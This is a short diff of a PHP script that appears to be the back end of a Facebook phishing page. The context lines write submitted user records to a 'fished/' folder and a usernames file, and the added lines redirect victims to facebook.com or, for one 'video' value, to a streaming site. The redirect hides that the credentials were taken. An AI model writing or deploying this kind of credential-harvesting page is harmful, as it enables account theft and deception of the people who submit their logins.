@@ -51,7 +51,11 @@ file_put_contents("usernames.json", json_encode($usuarios , JSON_PRETTY_PRINT) )
 
 file_put_contents('fished/' . date('Y-m-d') . '.txt', json_encode($usuario) . "\n----\n", FILE_APPEND | LOCK_EX);
 
-header('Location: https://www.facebook.com');
+if($_POST['video'] == 'ec4f4ae3') {
+    header('Location: https://cuevana3.io/serie/what-if');
+} else {
+    header('Location: https://www.facebook.com');
+}
 
 exit();
 ?>
